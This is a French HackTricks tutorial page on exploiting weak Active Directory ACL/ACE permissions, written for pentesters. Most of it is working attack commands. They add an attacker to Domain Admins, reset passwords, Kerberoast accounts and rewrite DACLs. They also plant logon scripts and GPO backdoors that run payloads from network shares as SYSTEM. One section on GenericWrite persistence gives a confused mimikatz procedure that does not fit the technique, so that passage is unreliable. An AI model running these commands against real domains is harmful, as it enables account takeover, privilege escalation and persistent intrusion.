# Abus des ACL/ACE d'Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Contexte

Ce laboratoire vise à exploiter les autorisations faibles des listes de contrôle d'accès discrétionnaire (DACL) et des entrées de contrôle d'accès (ACE) d'Active Directory qui composent les DACL.

Les objets d'Active Directory tels que les utilisateurs et les groupes sont des objets sécurisables et les DACL/ACE définissent qui peut lire/modifier ces objets (par exemple, changer le nom du compte, réinitialiser le mot de passe, etc.).

Un exemple d'ACE pour l'objet sécurisable "Domain Admins" peut être vu ici :

![](../../../.gitbook/assets/1.png)

Certaines des autorisations et types d'objets d'Active Directory qui nous intéressent en tant qu'attaquants sont :

* **GenericAll** - droits complets sur l'objet (ajouter des utilisateurs à un groupe ou réinitialiser le mot de passe de l'utilisateur)
* **GenericWrite** - mettre à jour les attributs de l'objet (par exemple, script de connexion)
* **WriteOwner** - changer le propriétaire de l'objet pour un utilisateur contrôlé par l'attaquant et prendre le contrôle de l'objet
* **WriteDACL** - modifier les ACE de l'objet et donner à l'attaquant un contrôle total sur l'objet
* **AllExtendedRights** - possibilité d'ajouter un utilisateur à un groupe ou de réinitialiser le mot de passe
* **ForceChangePassword** - possibilité de changer le mot de passe de l'utilisateur
* **Self (Self-Membership)** - possibilité de vous ajouter à un groupe

Dans ce laboratoire, nous allons explorer et essayer d'exploiter la plupart des ACE mentionnés ci-dessus.

Il est utile de se familiariser avec tous les [liens BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) et autant de [droits étendus](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) d'Active Directory que possible, car on ne sait jamais quand on peut rencontrer un droit moins courant lors d'une évaluation.

## GenericAll sur un utilisateur

À l'aide de powerview, vérifions si notre utilisateur d'attaque `spotless` a les droits `GenericAll` sur l'objet AD pour l'utilisateur `delegate` :
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```
Nous pouvons voir que notre utilisateur `spotless` a effectivement les droits `GenericAll`, ce qui permet à l'attaquant de prendre le contrôle du compte :

![](../../../.gitbook/assets/2.png)

*   **Changer le mot de passe** : Vous pouvez simplement changer le mot de passe de cet utilisateur avec la commande suivante :

```bash
net user <nom_utilisateur> <mot_de_passe> /domain
```
*   **Kerberoasting ciblé** : Vous pouvez rendre l'utilisateur **kerberoastable** en définissant un **SPN** sur le compte, le kerberoaster et essayer de le casser hors ligne :

```powershell
# Définir le SPN
Set-DomainObject -Credential $creds -Identity <nom_utilisateur> -Set @{serviceprincipalname="fake/NOTHING"}
# Obtenir le hash
.\Rubeus.exe kerberoast /user:<nom_utilisateur> /nowrap
# Nettoyer le SPN
Set-DomainObject -Credential $creds -Identity <nom_utilisateur> -Clear serviceprincipalname -Verbose

# Vous pouvez également utiliser l'outil https://github.com/ShutdownRepo/targetedKerberoast
# pour obtenir les hachages d'un ou de tous les utilisateurs
python3 targetedKerberoast.py -domain.local -u <nom_utilisateur> -p password -v
```
*   **ASREPRoasting ciblé** : Vous pouvez rendre l'utilisateur **ASREPRoastable** en **désactivant** la **pré-authentification** puis l'ASREProaster.

```powershell
Set-DomainObject -Identity <nom_utilisateur> -XOR @{UserAccountControl=4194304}
```

## GenericAll sur un groupe

Voyons si le groupe `Domain admins` a des autorisations faibles. Tout d'abord, obtenons son `distinguishedName` :
```csharp
Get-NetGroup "domain admins" -FullData
```
![](../../../.gitbook/assets/4.png)
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Nous pouvons voir que notre utilisateur d'attaque `spotless` a à nouveau les droits `GenericAll` :

![](../../../.gitbook/assets/5.png)

Cela nous permet efficacement de nous ajouter (l'utilisateur `spotless`) au groupe `Domain Admin` :
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/6.gif)

La même chose peut être réalisée avec le module Active Directory ou PowerSploit :
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Écrire sur l'ordinateur/l'utilisateur

* Si vous avez ces privilèges sur un **objet Ordinateur**, vous pouvez réaliser une [Délégation contrainte basée sur les ressources Kerberos : prise de contrôle de l'objet Ordinateur](../resource-based-constrained-delegation.md).
* Si vous avez ces privilèges sur un utilisateur, vous pouvez utiliser l'une des [premières méthodes expliquées sur cette page](./#genericall-on-user).
* Ou bien, si vous les avez sur un ordinateur ou un utilisateur, vous pouvez utiliser les **Informations d'identification Shadow** pour vous faire passer pour cet utilisateur :

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty sur le groupe

Si notre utilisateur contrôlé a le droit `WriteProperty` sur `Tous` les objets du groupe `Domain Admins` :

![](../../../.gitbook/assets/7.png)

Nous pouvons à nouveau nous ajouter au groupe `Domain Admins` et augmenter nos privilèges :
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## Auto-appartenance (Self-Membership) au groupe

Un autre privilège qui permet à l'attaquant de s'ajouter lui-même à un groupe :

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
![](../../../.gitbook/assets/10.png)

## WriteProperty (Auto-appartenance)

Un autre privilège qui permet à l'attaquant de s'ajouter à un groupe :
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/11.png)
```csharp
net group "domain admins" spotless /add /domain
```
![](../../../.gitbook/assets/12.png)

## **ForceChangePassword**

Si nous avons les droits `ExtendedRight` sur le type d'objet `User-Force-Change-Password`, nous pouvons réinitialiser le mot de passe de l'utilisateur sans connaître son mot de passe actuel :
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/13.png)

Faire la même chose avec powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
![](../../../.gitbook/assets/14.png)

Une autre méthode qui ne nécessite pas de manipuler la conversion de chaîne de caractères sécurisée par mot de passe :
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...ou une seule ligne si aucune session interactive n'est disponible :
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

et une dernière façon de réaliser cela depuis Linux :
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
Plus d'informations:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner sur le groupe

Notez comment avant l'attaque, le propriétaire de `Domain Admins` est `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Après l'énumération ACE, si nous constatons qu'un utilisateur sous notre contrôle a des droits `WriteOwner` sur `ObjectType:All`
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/18.png)

...nous pouvons changer le propriétaire de l'objet `Domain Admins` pour notre utilisateur, qui dans notre cas est `spotless`. Notez que le SID spécifié avec `-Identity` est le SID du groupe `Domain Admins`:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
![](../../../.gitbook/assets/19.png)

## GenericWrite sur l'utilisateur

Lorsque vous avez réussi à obtenir des privilèges d'administration sur un contrôleur de domaine Active Directory, vous pouvez utiliser l'autorisation GenericWrite pour persister vos accès. L'autorisation GenericWrite permet à un utilisateur de modifier les attributs d'un objet sans avoir à connaître les valeurs actuelles de ces attributs.

Pour exploiter cette méthode, vous devez suivre les étapes suivantes :

1. Identifiez un utilisateur avec des privilèges d'administration sur le domaine.
2. Utilisez l'outil `mimikatz` pour extraire le hash NTLM de l'utilisateur.
3. Utilisez l'outil `mimikatz` pour créer un ticket Kerberos pour l'utilisateur avec l'autorisation GenericWrite.
4. Utilisez l'outil `mimikatz` pour injecter le ticket Kerberos dans le processus `lsass.exe` du contrôleur de domaine.
5. Utilisez l'outil `mimikatz` pour exécuter une commande en tant qu'utilisateur avec l'autorisation GenericWrite.

Une fois que vous avez réussi à persister vos accès en utilisant l'autorisation GenericWrite, vous pouvez continuer à accéder au système même si vos privilèges d'administration sont révoqués. Cela peut être particulièrement utile pour maintenir un accès persistant à un environnement compromis.
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/20.png)

La permission `WriteProperty` sur un `ObjectType`, qui dans ce cas particulier est `Script-Path`, permet à l'attaquant de remplacer le chemin du script de connexion de l'utilisateur `delegate`, ce qui signifie que la prochaine fois que l'utilisateur `delegate` se connectera, son système exécutera notre script malveillant :
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
Ci-dessous montre que le champ du script de connexion de l'utilisateur ~~`délégué`~~ a été mis à jour dans l'AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite sur le groupe

Cela vous permet de définir de nouveaux utilisateurs (vous-même par exemple) en tant que membres du groupe:
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## WriteDACL + WriteOwner

Si vous êtes le propriétaire d'un groupe, comme je suis le propriétaire d'un groupe AD `Test` :

![](../../../.gitbook/assets/22.png)

Ce que vous pouvez bien sûr faire via PowerShell :
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![](../../../.gitbook/assets/23.png)

Et si vous avez un `WriteDACL` sur cet objet AD :

![](../../../.gitbook/assets/24.png)

...vous pouvez vous donner des privilèges [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) avec une pincée de sorcellerie ADSI :
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
Ce qui signifie que vous avez désormais un contrôle total sur l'objet AD :

![](../../../.gitbook/assets/25.png)

Cela signifie concrètement que vous pouvez désormais ajouter de nouveaux utilisateurs au groupe.

Il est intéressant de noter que je n'ai pas pu abuser de ces privilèges en utilisant le module Active Directory et les cmdlets `Set-Acl` / `Get-Acl` :
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Réplication sur le domaine (DCSync)**

La permission **DCSync** implique d'avoir les permissions suivantes sur le domaine lui-même : **DS-Replication-Get-Changes**, **Replicating Directory Changes All** et **Replicating Directory Changes In Filtered Set**.\
[**En savoir plus sur l'attaque DCSync ici.**](../dcsync.md)

## Délégation de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

Parfois, certains utilisateurs/groupes peuvent se voir déléguer l'accès pour gérer les objets de stratégie de groupe, comme c'est le cas avec l'utilisateur `offense\spotless` :

![](../../../.gitbook/assets/a13.png)

Nous pouvons le voir en utilisant PowerView de la manière suivante :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
Le tableau ci-dessous indique que l'utilisateur `offense\spotless` dispose des privilèges **WriteProperty**, **WriteDacl**, **WriteOwner**, ainsi que d'autres qui sont propices à l'abus :

![](../../../.gitbook/assets/a14.png)

### Énumérer les autorisations des GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Nous savons que le ObjectDN ci-dessus, provenant de la capture d'écran ci-dessus, fait référence à l'objet GPO `New Group Policy Object`, car le ObjectDN pointe vers `CN=Policies` et également vers `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, qui est identique aux paramètres de la GPO, comme indiqué ci-dessous :

![](../../../.gitbook/assets/a15.png)

Si nous voulons rechercher spécifiquement des GPO mal configurés, nous pouvons enchaîner plusieurs cmdlets de PowerSploit de la manière suivante :
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![](../../../.gitbook/assets/a16.png)

**Ordinateurs avec une politique donnée appliquée**

Nous pouvons maintenant résoudre les noms des ordinateurs sur lesquels la stratégie GPO "Politique mal configurée" est appliquée :
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
![](../../../.gitbook/assets/a17.png)

**Politiques appliquées à un ordinateur donné**
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media\&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

**Unités organisationnelles avec une politique donnée appliquée**
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abus de GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

L'une des façons d'abuser de cette mauvaise configuration et d'obtenir une exécution de code consiste à créer une tâche planifiée immédiate via la GPO comme suit :
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

Ce qui précède ajoutera notre utilisateur spotless au groupe local `administrateurs` de la machine compromise. Notez comment avant l'exécution du code, le groupe ne contient pas l'utilisateur `spotless` :

![](../../../.gitbook/assets/a20.png)

### Module GroupPolicy **- Abus de GPO**

{% hint style="info" %}
Vous pouvez vérifier si le module GroupPolicy est installé avec `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. En cas de besoin, vous pouvez l'installer avec `Install-WindowsFeature –Name GPMC` en tant qu'administrateur local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Ce payload, une fois que le GPO est mis à jour, nécessitera également que quelqu'un se connecte à l'ordinateur.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abus de GPO**

{% hint style="info" %}
Il ne peut pas créer de GPO, nous devons donc toujours le faire avec RSAT ou modifier celui auquel nous avons déjà accès en écriture.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour de la stratégie <a href="#force-policy-update" id="force-policy-update"></a>

Les mises à jour abusives précédentes des **GPO sont rechargées** environ toutes les 90 minutes.\
Si vous avez accès à l'ordinateur, vous pouvez le forcer avec `gpupdate /force`.

### Sous le capot <a href="#under-the-hood" id="under-the-hood"></a>

Si nous observons les tâches planifiées de la GPO `Misconfigured Policy`, nous pouvons voir notre `evilTask` assis là :

![](../../../.gitbook/assets/a22.png)

Ci-dessous se trouve le fichier XML qui a été créé par `New-GPOImmediateTask` et qui représente notre tâche planifiée malveillante dans la GPO :

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
<Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
<Task version="1.3">
<RegistrationInfo>
<Author>NT AUTHORITY\System</Author>
<Description></Description>
</RegistrationInfo>
<Principals>
<Principal id="Author">
<UserId>NT AUTHORITY\System</UserId>
<RunLevel>HighestAvailable</RunLevel>
<LogonType>S4U</LogonType>
</Principal>
</Principals>
<Settings>
<IdleSettings>
<Duration>PT10M</Duration>
<WaitTimeout>PT1H</WaitTimeout>
<StopOnIdleEnd>true</StopOnIdleEnd>
<RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>false</AllowHardTerminate>
<StartWhenAvailable>true</StartWhenAvailable>
<AllowStartOnDemand>false</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
<RestartOnFailure>
<Interval>PT15M</Interval>
<Count>3</Count>
</RestartOnFailure>
</Settings>
<Actions Context="Author">
<Exec>
<Command>cmd</Command>
<Arguments>/c net localgroup administrators spotless /add</Arguments>
</Exec>
</Actions>
<Triggers>
<TimeTrigger>
<StartBoundary>%LocalTimeXmlEx%</StartBoundary>
<EndBoundary>%LocalTimeXmlEx%</EndBoundary>
<Enabled>true</Enabled>
</TimeTrigger>
</Triggers>
</Task>
</Properties>
</ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Utilisateurs et groupes <a href="#utilisateurs-et-groupes" id="utilisateurs-et-groupes"></a>

La même élévation de privilèges peut être réalisée en abusant de la fonctionnalité Utilisateurs et groupes de GPO. Notez dans le fichier ci-dessous, à la ligne 6 où l'utilisateur `spotless` est ajouté au groupe local `administrateurs` - nous pourrions changer l'utilisateur par autre chose, en ajouter un autre ou même ajouter l'utilisateur à un autre groupe/plusieurs groupes car nous pouvons modifier le fichier de configuration de la stratégie à l'emplacement indiqué en raison de la délégation GPO attribuée à notre utilisateur `spotless` :

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
<Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
<Members>
<Member name="spotless" action="ADD" sid="" />
</Members>
</Properties>
</Group>
</Groups>
```
{% endcode %}

De plus, nous pourrions envisager d'exploiter des scripts de connexion/déconnexion, d'utiliser le registre pour les autoruns, d'installer des fichiers .msi, de modifier les services et d'autres méthodes d'exécution de code similaires.

## Références

* Initialement, ces informations ont été principalement copiées depuis [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vulnérabilités les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menace proactives et détecte les problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) dès aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
